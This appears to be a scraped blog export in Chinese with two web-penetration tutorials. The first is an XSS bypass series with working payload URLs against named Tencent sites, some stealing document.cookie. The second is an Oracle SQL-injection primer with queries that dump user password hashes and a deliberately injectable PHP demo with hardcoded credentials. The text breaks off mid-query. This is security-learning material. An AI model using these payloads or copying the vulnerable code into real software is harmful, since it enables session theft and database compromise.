12location.href='........&amp;searchvalue_yjbg=aaaaaa'location.href='........&amp;searchvalue_yjbg=aaaaaa'+alert(1)+'' location.href='........&amp;searchvalue_yjbg=aaaaaa&amp;#x27;+alert(1)+&amp;#x27;' 步骤如下： 接着我们把代码转换为 url 的编码。 &amp; -&gt; %26, # -&gt; %23 最后利用代码如下： 1http://stock.finance.qq.com/report/search.php?searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27; 用户点击页面[GO]按钮触发。 缺陷页面的 []() 触发点的代码如下： 1&lt;li&gt;&lt;div class=&quot;yebg&quot;&gt;&lt;a href=&quot;javascript:location='http://stock.finance.qq.com/report/search.php?offset='+document.getElementById('pagenum'). value+'&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=aaaaaaaaaa'&quot;&gt;GO&lt;/a&gt;&lt;/div&gt;&lt;/li&gt; 修复方案 对于输出在 HTML 属性中的情况，需要特殊情况特殊对待，该过滤\\的时候，请过滤\\, 该过滤&amp;的情况，则过滤掉&amp; 碰到有某些修复的人用正则去判断， &amp;#xNNN.., 而实际上 &amp;#x0NN; &amp;#x00NN, （后面自己慢慢试。。） 都是可以的。 或者是 &amp;#10 进制; 以及一些特殊的 HTML 实体，如 &quot; 等，都要注意到，好麻烦， 最好的办法，还是 &amp;过滤为 &amp;amp;） 个人备注​ 基于CSS expression的XSS基本碰不到了。之前\\65可能直接表示字母e，但是现在要使用\\x65，这是需要注意的地方。 4. 宽字节复仇记 [QQ 邮箱基本通用] 来源：[4. 宽字节复仇记 QQ 邮箱基本通用] 简要描述前面教程第 2 节，说到了输出在&lt;script&gt;..&lt;/script&gt;之间的情况。也说到了后面会再继续一些有意思的例子。 实际上，我们碰到的往往不是那么好。很多情况下，程序员都是会过滤的。 那么我们怎么办呢？ “因地制宜，因材施教。” 根据漏洞的实际情况，我们可以各种绕过。 不知道这里乱用成语没啊。 惶恐不安中。 这里先看看第一种方法，宽字节绕过。 详细说明 有一个比较经典的 SQL 注入，是宽字节注入。玩渗透的可能对这个都比较清楚。 有时候，宽字节确实可以带来奇效～～下面我们看腾讯的一个例子。 例子如下： 1http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%22;alert(1);//aaaaaa 我们尝试注入 “ 来闭合前面的双引号，但是很悲剧的是，双引号被过滤了。。 如下图： 看到这种情况，一般人估计会放弃了吧，至少说明程序员注意到了这里，并且过滤了。 然后我们可以看到编码是： 1&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt; gbxxxx 系列的编码，那么我们尝试一下宽字节呢？ 1http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa 看看效果： 弹个窗： 至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。并不是因为%22 变 成了 %5c%22,而 %c0 吃掉了后面的%5c。 而后面这种情况，在腾讯的相关站点暂时没有发现实际案例。 如果有，欢迎大家分享。 漏洞证明不一一列举了。有这个参数的基本都有问题。 1234567891011121314151617http://msgopt.mail.qq.com/cgi-bin/readtemplate?sid=ktqO7DjMQcJuAABQ&amp;folderid=9&amp;pagehttp://msgopt.mail.qq.com/cgi-bin/readtemplate?sid=ktqO7DjMQcJuAABQ&amp;folderid=9&amp;page=0&amp;t=aaaa%c0%22;alert(1);//bbbbx&amp;loc=folderlist,,,9http://r.mail.qq.com/cgi-bin/reader_main?sid=ktqO7DjMQcJuAABQ&amp;t=aaaa%c0&quot;bbbbx&amp;source=folderlisthttps://exmail.qq.com/cgi-bin/bizmail?sid=N7fzoGwkeI8ydyRo,7&amp;action=show_user&amp;alias=zhaopin@ucanlove.com&amp;t=%c0&quot;ccccbbbbx&amp;s=showaccounthttps://exmail.qq.com/cgi-bin/loginpage?errtype=3&amp;verify=true&amp;clientuin=info&amp;t=dm_loginpage&amp;d=fartech.cn&amp;s=&amp;alias=&amp;regalias=&amp;delegate_url=&amp;title=&amp;url=%2Fcgi-bin%2Flogin%3F&amp;org_fun=&amp;aliastype=other&amp;ss=&amp;from=&amp;autologin=n&amp;param=&amp;sp=&amp;r=b63f6de34c24eeb8a3099ab4bbfc1b8d&amp;ppp=&amp;secpp=%c0%22onmousebbbb=alert(document.cookie);//&amp;dmtype=bizmailhttp://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0&quot;ccccbbbbxhttp://open.mail.qq.com/cgi-bin/communication?sid=,2,zh_CN&amp;t=%c0&quot;ccccbbbbx&amp;action=http://open.mail.qq.com/cgi-bin/feedback_loop?sid=,2,zh_CN&amp;check=false&amp;t=%c0&quot;ccccbbbbx&amp;action=http://exmail.qq.com/cgi-bin/viewdocument?sid=H6Mg9z5XNfqsfhdH,7&amp;filename=%CC%EC%BD%F2%BB%C6%BD%F0%C8%D5%D6%DC%C6%C00917.doc&amp;mailid=ZL2017-RfnEvncOeLfhJ04eTPrSU29&amp;retry=true&amp;t=%c0%22ccccbbbbx&amp;ef=qfunchttp://reader.qq.com/cgi-bin/rss_main?sid=MTOtOYwpx56MMzN9&amp;t=aaaa%c0%22;alert(document.cookie);//bbbbx&amp;s=mag&amp;r=222&amp;init=true&amp;update=1 修复方案修复相关过滤机制。 个人备注1、宽字节注入，首先确定该网站知否支持gb其他系列编码。 2、%c0%22其中%22代表双引号，c0是随意添加的（ascii码大于128位时，自动拼接后面的两位），不是真的要构造一个汉字。所以说c0可以吃掉5c 5. 反斜线复仇记 来源：5. 反斜线复仇记 简要描述还是在&lt;script&gt;之间的场景，某些情况下，我们仅仅需要的只是一个反斜线，就可以绕过过滤了。 详细说明 有以下实例点。 1http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=aaa&amp;from=bbb&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi- bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526cl ickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1 对应的输出，如下图所示： 经过测试，我们可以看到，双引号是用不了（被过滤为&amp;quot;)， 但是 反斜线还可以使用。 那么这里是否可以成功的 XSS 呢？ 我们把缺陷代码部分提取出来。 1&lt;script&gt;getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;+&quot;&amp;t=&quot;+&quot;&amp;alias=&quot;+&quot;&amp;regali as=&quot;+&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting1 0%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title=&quot;+&quot;&amp;url=%2 Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Din dex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;+&quot;&amp;org_fun=&quot;+&quot;&amp;aliastype=&quot;+&quot;&amp;ss=aaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;+&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r=3ec785174fff5206 ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp=&quot;+&quot;&amp;secpp=&quot;&lt;/script&gt; 可以看到有缺陷的部分是 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;//后面省略。 我们可以控制的是 aaaa ，又不能用&quot;，怎么办呢？ 因为我们可以使用 \\，那么我们可以杀掉 aaaa 后面的 双引号。 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\\&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;; 可以看到代码的结果因为一个反斜线发生了变化，如下图： 为了保证 bbb 后面的语法正确性，我们把 bbb 改为一个数字，把 bbb 后面加上 // 来注释掉后面的部分。变成以下形式。 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\\&quot;+&quot;&amp;from=1//&quot;+&quot;&amp;param=&quot;; 看起来不错哦，但是会出来一些问题，&quot;字符串&quot;&amp;from=1，这样是错误的，因为&amp;符号的优先级高， (&quot;字符串&quot;&amp;from)=1 是无法进行 这种赋值操作的。这样一来还是不行。别着急。我们可以稍微改动一下。变为以下形式。 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\\&quot;+&quot;&amp;from==1//&quot;+&quot;&amp;param=&quot;; 由于==的优先级比 &amp; 高，所以语句相当于 (&quot;字符串&quot;)&amp;(from==1) 更顺眼了，但是还是会悲剧啊。由于 from 未定义，直接和 1 进行相等判断的话，会报错，错误是：“from”未定义。。。怎么办呢？ 别紧张，javascript 里有一个特性。 如下： 12345aaa();function aaa(){} 凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。换句话说： 解析器在解析 JS 代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是： 12345function aaa(){}aaa(); 利用这样一个特性，我们的代码可以改改。 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\\&quot;+&quot;&amp;from==1;function from(){}//&quot;+&quot;&amp;param=&quot;; 这样一来，我们的 function from(){} 就会被提前解析，从而定义了 from, 后面 from==1 的时候，就不会报错啦～～ 故事往往是曲折的，到了这一步，我们会发现还是不行。 看一看源代码吧～～ ，哎，我们的空格被转义为了 当然，这么一点小事情，难不到我们的，我们用注释符来做分隔符。 /**/替换空格，有没有觉得和 sql 注入一样了，咔咔。 于是，我们的代码变为了： 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\\&quot;+&quot;&amp;from==1;function/**/from(){}//&quot;+&quot;&amp;param=&quot;; 嗯，这次没有语法错误了，我们插入我们自己的 JS 代码。 1location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\\&quot;+&quot;&amp;from==1;alert(1);function/**/from(){}//&quot;+&quot;&amp;param=&quot;; 最终的利用代码如下： 恩，这次是我们的 反斜线为 双引号报仇啦！ 只有在不登录 QQ 邮箱的情况下触发，比较鸡肋，实际意义不大，仅供研究。 修复方案 随便修修就好。 某些情况下，\\ 还是很危险的。 6. 换行符复仇记 来源：6. 换行符复仇记 简要描述还是在``之间的场景，某些情况下，我们仅仅需要的只是一个换行符，就可以绕过过滤了。 它让双引号，尖括号知道了“它 们不是一个符号在战斗”。 1.实际场景是下面这个例子。 1http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=aaaaaaaaaa 对应的，我们可以看到我们的输入 aaaaaaaaa 会在页面的哪些输出点出现呢？ 不错，一共有 5 处，有在 HTML 标签之间的（教程 1），也有在&lt;script&gt;..&lt;/script&gt;之间的。但是呢，该过滤的，&lt; , &gt; 过滤掉了，该过滤的 &quot; ，也过滤掉了。。 也就是说传统的已经不行啦，我们继续看 5 处的其他地方。呀，竟然还有一大段注释里，也出现了我们的【输出】 嗯，这样一来，是否会想到这样一个用法呢？ 1//我是注释，我爱洗澡，哦～哦～哦～ [我是输出] 如果可以使用换行符的话。 这样 alert(1); 就会被成功执行。 恩，带着这样一个想法，我们不难构造出以下利用。 1http://datalib.games.qq.com/cgi-bin/search?libid=178&amp;FilterAttrAND=3602&amp;FilterValueAND=%0aalert(1);// 看下输出。嘿，果然没过滤。 这样，这一次我们的换行符立功了， 它不是一个符号在战斗！ 修复方案尽量不要在 JS 的注释里输出内容。还挺危险的。 个人备注1、记住几个常用的html编码：如&lt;对应&amp;lt; &gt;对应&amp;gt; “对应&amp;quot; 2、换行符%0a 7. 宽字节、反斜线与换行符一起复仇记 来源：7. 宽字节、反斜线与换行符一起复仇记 简要描述这一次，3 个家伙一起上啦～ 详细说明 实例点如下： 1http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138, 138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaaaaaaaaaa 老规矩，继续看我们的输出。 一共有 3 处输出，位于 HTML 属性里的那一处，我们放弃了，因为双引号被灭掉了。那么还剩下 2 处。 都是位于&lt;script&gt;...&lt;/script&gt;里，而且挨在了一起。 先看第 2 处，是不是似曾相似啊？ 对的，教程 6 里刚刚遇到过。那就是输出在【注释】的情况。我们用换行符试试？ 一条是好消息，换行可以用，一条是坏消息。。下面出现的一句坏了我们的好事。。肿么办。 这个时候，我们需要先说点 javascript 的知识。 javascript，字符串允许下面多行的写法。 12var a=&quot;我是一个字符串\\ 我还是一个字符串&quot;;alert(a); 基于这点，我们可以把缺陷点构造成下面的样子。 12//document.getElementById(&quot;order_select&quot;).value = &quot;aaaa\\ alert(1);//&quot;;var searchOrder = &quot;aaaa\\ alert(1);//&quot;; 那么代码构造的解析如下： 7.带着这个想法，请上我们的反斜线。。 悲剧的是，反斜线被过滤成了 2 个\\\\，这下不好办了。 还记得在教程 4 里，我们提到的宽字节用法么？说到了 %c0 可以吃掉%5c。 我们看看页面的编码。 1&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt; gbxxx 系列的啊，窃喜中。 于是，我们的%c0 也加入战斗了。 1http://cgi.data.tech.qq.com/index.php?mod=search&amp;type=data&amp;site=digi&amp;libid=2&amp;curpage=1&amp;pagenum=30&amp;filterattr=138,138|16|4,5,4,5&amp;filtervalue=3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaa%c0%5c%0aalert(1);// 看看源码中的输出。 \\\\ 被我们变成了 乱码+\\ 此时，标点符号们正在开会，开会的主题是：“大家好，才是真的好” 修复方案参加前面教程4，5，6","link":"/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/"},{"title":"Oracle注入","text":"Oracle 极速入门我们可以把 Database（数据库） 看作是一个大仓库，仓库分了很多很多的房间，Schema 就是其中的房间，一个 Schema 代表一个房间，Table 可以看作是每个Schema 中的床，Table（表）被放入每个房间中，不能放置在房间之外，放在外面岂不是就是无家可归了。然后床上可以放置很多物品，就好比 Table 上可以放置很多列和行一样。数据库中存储数据的基本单元是 Table，对应现实中每个仓库放置物品的基本单位就是床， User（用户） 就是每个 Schema 的主人（所以 Schema 包含的是 Object，而不是 User），User 和 Schema 是一一对应的，每个 User 在没有特别指定下只能使用自己 Schema（房间）的东西，如果一个 User 想使用其他 Schema（房间）的东西，那就要看那个 Schema（房间）的 User（主人）有没有给你这个权限了，或者看这个仓库的老大（DBA）有没有给你这个权限了。换句话说，如果你是某个仓库的主人，那么这个仓库的使用权和仓库中的所有东西都是你的（包括房间），你有完全的操作权，可以扔掉不用的东西从每个房间，也可以放置一些有用的东西到某一个房间，你还可以给每个 User 分配具体的权限，也就是规定某 User（某人）到 某一个 Schema（某一个房间）能做些什么，是只能看（Read-Only），还是可以像房间主人一样有所有的控制权（R/W）。这个就要看这个 User 所对应的 Role（角色）了。假如你是仓库的老大（DBA），你还可以设计一张工卡（角色），分为普通用户与 vip，拥有 vip 工卡的人，可以拥有你的权限。工卡（角色）并不指代具体的用户，只是权限的集合。 基本概念Oracle 中有三个重要的基本概念：数据库实例、数据库、SID。 Oracle 的数据库实例（Instance）其实是后台进程和 SGA 的总称： 后台进程：负责接受和处理客户端传来的数据，如 Windows 下由 oracle.exe 进程负责分发和处理请求。 SGA：全称为 System Global Area，即系统全局区域。实际上是内存中的一片共享区域，其中包含实例配置、数据缓存、操作日志等信息，由后台进程进行共享。 而通常数据库实例会用一个唯一标识来标识，这个标识符便称为 SID（System Identifier）。 数据库一般指物理存储的文件，Oracle 数据库除了基本的数据文件，还有控制文件和 Redo 日志。数据库一般位于 $ORACLE_HOME/oradata/SID，SID 对应创建数据库时指定的实例 SID，数据文件以 *.dbf 的形式存放。 首先，数据库实例和数据库并不是必须相互依赖而存在的。当实例启动时，可以不关联任何数据库。数据库可以存在于磁盘，不附加到任何实例，当然这样无法与用户进行交互。一般而言，数据库附加到实例中，与其进行关联，是一对一的关系。但是在集群环境下，一个数据库可以对应多个实例，这些实例分布在不同的服务器上。但反过来，一个实例只能对应一个数据库。 数据结构表空间相对于其他数据库，Oracle 中有一个比较特殊的概念：表空间（Tablespace）。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库： 如上图，当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP： SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息 SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担 UNDOTBS：用于事务回退等 TEMP：作为缓存空间减少内存负担 USERS：就是存储我们定义的表和数据 SchemaOracle 数据库支持多用户，用户想在同个数据库中创建相同名称的表或其他歧义数据，该怎么办？ Oracle 中使用 Schema 的概念将每个用户的数据进行分离，Schema 其实类似于命名空间（Namespace），默认情况下，Schema 的名称同用户名称相同。 Schema和表空间是一个层次的概念，它们都有一个很重要的特性，就是对表的独占性。Schema 是表的逻辑集合，是所有应用访问表必须指定的对象（一般都省略了，但是实际上一定是 db.schema.table 这种访问模式，例如访问 scott 用户下的 emp 表，这时 Schema 的名称也为 scott，而 select from emp 这条 sql 语句的完整写法为：select from scott.emp），同一张表不可能既属于这个 Schema，又属于另一个 Schema。表空间是表的物理集合，是所有磁盘读写必须访问的文件（一般由 Oracle 管理，个性化的需求DBA 管理），同一张表也不可能既放在这个表空间，又放在那个表空间。 权限与用户管理权限和角色Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的 CURD 操作（即，增加：create，修改：update，查找：read，删除：delete），DBA 则集合了所有的用户权限。 用户创建数据库时，会默认启用 sys、system 等用户： sys：相当于 Linux 下的 root 用户。为 DBA 角色 system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。 public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限） 一篇比较详细的 Oracle 权限管理的博文：传送门🚪 基本语法按照 MySQL 注入的学习方法，先从语法入手： 123456select column, group_function(column)from table[where condition][group by group_by_expression][having group_condition][order by column]; 执行过程：from — where — group by — having — select — order by 可以看出，和 MySQL 很类似。实际上都是 SQL 标准的语法。 与MySql异同注意 以下加了 -- priv 的语句说明需要管理员权限 虽然 Oracle 没有类似 MySQL 的数据库的概念，而是用表空间来代替：一个 Oracle 只有一个数据库，它给账户开辟数据库空间，称之为表空间(TableSpace)，创建数据库就是开辟账户的表空间。为了叙述的方便，我将 Oracle 的表空间也称为 数据库 语法 Oracle中select 必须要指明表名。若并非对真实的表进行查询，则需要用 dual 作为表名，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。。 单引号与双引号：Oracle 的单引号与 MySQL 一直，但是双引号用于消除系统关键字。例如，有个表的字段叫sysdate，因为sysdate属于oracle中的关键字，但你要查询这个字段的时候，就需要select &quot;sysdate&quot; from dual;，若用 select 'sysdate' from table_name;查询就相当于 select sysdate from table_name;，而sysdate 用于获得当前时间。 第 n 行的数据：SELECT colmn_name FROM (SELECT ROWNUM r, table_name FROM users ORDER BY colmn_name) WHERE r=n;：select colmn_name from table_name limit n, 1; Oracle中limit应该使用虚表中的rownum字段通过where条件判断 1select * from pyy where rownum = 1; #查询一行 Oracel的单行注释符是–，多行注释符是/**/ 拼接字符：SELECT 'a' || 'b' FROM dual;：select 'a' 'b' case 语法：SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;：SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; Oracle 中空字符串''就是null（也就是说，只有null，没有空字符），而 MySQL 是区分null和''的。 系统表 dba_tables : 系统里所有的表的信息，需要DBA权限才能查询 all_tables : 当前用户有权限的表的信息（只要对某个表有任何权限，即可在此视图中看到表的相关信息） user_tables: 当前用户名下的表的信息 DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表 ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表 USER_ALL_TABLES：某一用户所拥有的对象和表 总结： DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES DBA_ALL_TABLES &gt;= ALL_ALL_TABLES &gt;= USER_ALL_TABLES user_tables 的范围最小，all_tables 看到的东西稍多一些，而 dba_tables 的信息最全 同样，user_tab_columns、all_tab_columns、dba_tab_columns 也是一样的。 获取数据库信息描述：Oracle: MySQL 服务器版本：SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; 或者 SELECT version FROM v$instance;：select version() 操作系统版本：SELECT banner FROM v$version where banner like 'TNS%';: @@version_compile_os 当前数据库：SELECT global_name FROM global_name; 或者 SELECT name FROM v$database;或者SELECT instance_name FROM v$instance;或者SELECT SYS.DATABASE_NAME FROM DUAL;：select database() 获取当前用户权限的所有数据库：SELECT DISTINCT owner, table_name FROM all_tables; 表名：SELECT table_name FROM all_tables;：select table_name from information_schema.tables 字段名：SELECT column_name FROM all_tab_columns：select COLUMN_NAME from information_schema.COLUMNS 获取用户信息描述：Oracle: MySQL 当前数据库用户：SELECT user FROM dual;: user() 所有数据库用户：SELECT username FROM all_users ORDER BY username; 或者 SELECT name FROM sys.user$; -- priv：select user from mysql.user; 所有数据库用户的密码 hash：SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g 或者 SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g： 当前用户的权限：SELECT * FROM session_privs;：show grants; 所有用户的权限：SELECT * FROM dba_sys_privs -- priv：select Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv from mysql.user; -- priv, mysql.user 中各种以 _priv 结尾的字段 用户角色：SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS; 或者 SELECT DISTINCT grantee FROM dba_sys_privs：select user, Super_priv from mysql.user; 函数两者相同数学函数 ROUND、ABS、CEIL、FLOOR、MAX、MIN 字符串函数 ASCII、CHAR、REPLACE、SUBSTRING、INSTR、LOCATE、LPAD、UPPER、LOWER 两者不同描述：Oracle: MySQL 按位与：SELECT bitand(6, 2) FROM dual;：select 6 &amp; 2 字符串转 hex：select utl_raw.cast_to_raw('admin') from dual;：hex() 查找子串：select INSTR('sdsq', 's', 2) value from dual -- 要求从位置 2 开始：select INSTR('sdsq', 's') value -- 从默认的位置 1 开始，无法改变 SUBSTR：MySQL 有，Oracle 无，但是 Oracle 可用 substring 代替 求字符长度：LENGTH：CHAR_LENGTH 求字节长度：LENGTHB：LENGTH “case”：select decode('s', 's', 'n', 'none') from dual; -- decode(条件, 值 1, 翻译值 1, 值 2, 翻译值2 , ...值 n, 翻译值 n, 缺省值)：用 case 实现 时延：select DBMS_PIPE.RECEIVE_MESSAGE('任意值', 1) from dual;：sleep(1)。除此之外时延还可以利用 select count(*) from all_objects;来，原理是需要花费较多时间去查询所有数据库的条目。另外，利用 带外通道 发起网络请求，也有可能造成时延。 SYS_CONTEXT系统启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。更多可用参数说明可以查阅 Oracle 提供的文档：SYS_CONTEXT 更多非函数的语句区别可以见这个博文：传送门🚪 常用SQL语句获取数据库版本1234SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';SELECT * from v$version WHERE rownum=1;SELECT version FROM v$instance;select version from product_component_version; 注：v$version视图在sys表空间下，只有BANNER一列，数据库的版本就在第一行，所以一般不用like，只需where rownum = 1即可 返回的字段为：Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 所以延时注入时，快速查版本号使用select * from v%instance;语句 获取操作系统版本1SELECT banner FROM v$version where banner like 'TNS%'; 1SELECT member from v$logfile WHERE rownum=1; --依据路径判断服务器操作系统 获取用户相关信息1234567891011121314151617181920212223242526272829获取数据库所有用户:SELECT user FROM dual;--获取当前数据库用户SELECT sys_context('userenv','current_user') from dual;--当前连接用户SELECT username FROM all_users ORDER BY username;--列出所有用户SELECT name FROM sys.user$; —- priv;列出所有用户列出所有数据库用户密码哈希:SELECT name, password, astatus FROM sys.user$ —- priv; &lt;= 10g(astatus能够在acct被锁定的状态下给你反馈)SELECT name,spare4 FROM sys.user$ —- priv; 11g获取数据库用户权限SELECT * FROM session_privs; 获取当前用户权限SELECT * from session_roles; --当前用户的权限SELECT * FROM dba_sys_privs; -- priv 获取所有用户权限获取用户角色SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;SELECT DISTINCT grantee FROM dba_sys_privs;列出DBA账户:SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES'; —- priv获取主机名和IPSELECT UTL_INADDR.get_host_name FROM dual;--主机名SELECT host_name FROM v$instance;--主机名SELECT UTL_INADDR.get_host_address FROM dual; --查IPSELECT UTL_INADDR.get_host_name('127.0.0.1') FROM dual; --查主机名称SELECT name FROM V$DATAFILE; --获取DB文件路径 获取当前数据库(SID)1234SELECT global_name FROM global_name;SELECT name FROM v$database;SELECT instance_name FROM v$instance; --服务器SIDSELECT SYS.DATABASE_NAME FROM DUAL; global_name也是单列 获取表名和字段名12345SELECT DISTINCT owner FROM all_tables; --列出所有数据库名SELECT table_name FROM all_tables; --获取所有表名SELECT owner, table_name FROM all_tables;--获取当前用户权限的所有表名SELECT column_name FROM all_tab_columns; --所有获取字段名SELECT column_name FROM all_tab_columns WHERE TABLE_NAME='ADMIN'; distinct去重 1234select TABLESPACE_NAME FROM USER_TABLESPACES;--查看所有的表空间select TABLE_NAME from USER_TABLES WHERE ROWNUM=1;--查看当前用户的所有表select column_name from user_tab_columns where table_name='DEMO';--查看当前用户的所有的列，如查询DEMO表下的所有列SELECT object_name from user_objects;--查看当前用户的所有对象（表名称，约束、索引） 环境搭建使用Kitematic搜索oracle11 安装后查看配置文件和DOC说明 随便启动一个apache ORACLE注入PHP-demo如下： 修改其中的HOST、PORT和SID和依据自己的数据库随便一条注入语句即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;!DOCTYPE html&gt;&lt;body&gt;&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); $id = @$_GET['id']; //$conn = oci_connect('system','Aa123456'); $dbstr =&quot;(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 32773)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = xe) (INSTANCE_NAME = xe)))&quot;; //连接数据库的参数配置 $conn = oci_connect('system','oracle',$dbstr);//连接数据库，前两个参数分别是账号和密码 if (!$conn) { $Error = oci_error();//错误信息 print htmlentities($Error['message']); exit; } else { echo &quot;&lt;h2&gt;Oracle 注入实验&lt;/h2&gt;&quot;.&quot;&lt;br&gt;&quot;; //ocilogoff($conn); $sql = &quot;select * from hr.JOB_HISTORY where JOB_ID='&quot;.$id.&quot;'&quot;;//sql语句 $ora_test = oci_parse($conn,$sql); //编译sql语句 oci_execute($ora_test,OCI_DEFAULT); //执行 echo &quot;-------------------------------------------------&lt;br&gt;&quot;; echo &quot;Oracle语句：&quot;.$sql; echo &quot;&lt;h2&gt;查询结果&lt;/h2&gt;&quot;.&quot;&lt;br&gt;&quot;; echo '&lt;table border=&quot;1&quot; width=&quot;1200&quot; align=&quot;left&quot;&gt;'; while($r=oci_fetch_row($ora_test)) //取回结果 { echo &quot;&lt;tr&gt;&quot;; $i=0; //echo $ora_test[0]; echo &quot;&lt;td&gt;&quot;; echo &quot;EMPLOYEE_ID:&quot;.$r[$i++].&quot; &lt;/t&gt; &lt;br&gt;&quot;; echo &quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;; echo &quot;START_DATA:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; echo &quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;; echo &quot;END_DATA:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; echo &quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;; echo &quot;JOB_ID:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; echo &quot;&lt;/td&gt;&quot;; echo &quot;&lt;td&gt;&quot;; echo &quot;DEPARTMENT_ID:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; echo &quot;&lt;/td&gt;&quot;; echo &quot;&lt;/tr&gt;&quot;; } echo &quot;&lt;/table&gt;&quot;; } oci_close($conn);//关闭连接?&gt;&lt;/body&gt;&lt;/html&gt; http://127.0.0.1/oracle.php?id=IT_PROG 可以执行则搭建成功。 联合注入正常执行，回显如下图 select * from hr.JOB_HISTORY where JOB_ID=’IT_PROG’ union select 1,null,null,(select banner from 